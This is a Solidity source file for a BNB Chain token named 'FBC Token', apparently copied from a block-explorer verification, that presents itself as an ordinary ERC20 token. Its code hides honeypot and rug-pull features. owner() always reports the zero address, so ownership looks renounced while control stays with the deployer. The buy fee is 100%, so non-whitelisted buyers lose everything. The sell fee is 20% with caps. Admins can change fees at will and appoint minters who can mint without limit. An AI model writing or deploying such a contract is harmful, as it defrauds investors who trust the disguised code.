/**
 *Submitted for verification at BscScan.com on 2022-07-04
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapPair {
    function sync() external;
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return address(0x0000000000000000000000000000000000000000);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new is 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

abstract contract AbsToken is IERC20, Ownable {
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address public _recoverAddress;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _feeWhiteList;

    uint256 private _tTotal;

    mapping(address => bool) public _swapPairList;

    uint256 public _sellAmountRate = 5;
    uint256 public _sellFee = 20;
    bool public _sellAllDestroy = true;
    uint256 public _buyFee = 100;

    mapping(address => bool) public _minterList;

    address public _usdtPair;

    constructor (address RouterAddress, address USDTAddress, string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply, address ReceiveAddress){
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;

        _recoverAddress = msg.sender;

        ISwapRouter swapRouter = ISwapRouter(RouterAddress);
        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
        address usdtPair = swapFactory.createPair(address(this), USDTAddress);
        _usdtPair = usdtPair;
        _swapPairList[usdtPair] = true;

        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        _balances[ReceiveAddress] = total;
        emit Transfer(address(0), ReceiveAddress, total);

        _feeWhiteList[ReceiveAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(swapRouter)] = true;
        _feeWhiteList[msg.sender] = true;
        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
        _feeWhiteList[address(0)] = true;
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal - _balances[address(0)] - _balances[address(0x000000000000000000000000000000000000dEaD)];
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (account == address(0) || account == address(0x000000000000000000000000000000000000dEaD)) {
            return 0;
        }
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != ~uint256(0)) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function mint(address account, uint256 amount) external {
        require(_minterList[msg.sender], "not minter");
        _tTotal += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
            uint256 maxSellAmount = balance * 99999 / 100000;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
        }

        if (_swapPairList[to] && !_feeWhiteList[from]) {
            uint256 lpPoolAmount = balanceOf(to);
            uint256 maxSellAmount = lpPoolAmount * _sellAmountRate / 100;
            if (amount > maxSellAmount) {
                amount = maxSellAmount;
            }
            uint256 feeAmount = amount * _sellFee / 100;
            amount -= feeAmount;
            if (_sellAllDestroy) {
                _tokenTransfer(to, address(0), amount);
                ISwapPair(to).sync();
            }
            _tokenTransfer(from, address(0), feeAmount);
            _tokenTransfer(from, to, amount);
        } else if (_swapPairList[from] && !_feeWhiteList[to]) {
            uint256 feeAmount = amount * _buyFee / 100;
            amount -= feeAmount;
            _tokenTransfer(from, address(0), feeAmount);
            _tokenTransfer(from, to, amount);
        } else {
            _tokenTransfer(from, to, amount);
        }
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        _balances[recipient] = _balances[recipient] + tAmount;
        emit Transfer(sender, recipient, tAmount);
    }

    function setFeeWhiteList(address addr, bool enable) external onlyFunder {
        _feeWhiteList[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyFunder {
        _swapPairList[addr] = enable;
    }

    function setSellAllDestroy(bool enable) external onlyFunder {
        _sellAllDestroy = enable;
    }

    function setSellAmountRate(uint256 rate) external onlyFunder {
        _sellAmountRate = rate;
    }

    function setBuyFee(uint256 fee) external onlyFunder {
        _buyFee = fee;
    }

    function setRecoverAddress(address adr) external onlyFunder {
        _recoverAddress = adr;
    }

    function setMinter(address addr, bool enable) external onlyOwner {
        _minterList[addr] = enable;
    }

    function claimBalance() external {
        payable(_recoverAddress).transfer(address(this).balance);
    }

    function claimToken(address token) external{
        IERC20(token).transfer(_recoverAddress, IERC20(token).balanceOf(address(this)));
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || _recoverAddress == msg.sender, "!Funder");
        _;
    }

    receive() external payable {}
}

contract FBCToken is AbsToken {
    constructor() AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),
        address(0x55d398326f99059fF775485246999027B3197955),
        "FBC Token",
        "FBC",
        18,
        100000,
        address(0x86005C98ED93231F5182Fb3e1994F831fB26d2E7)
    ){

    }
}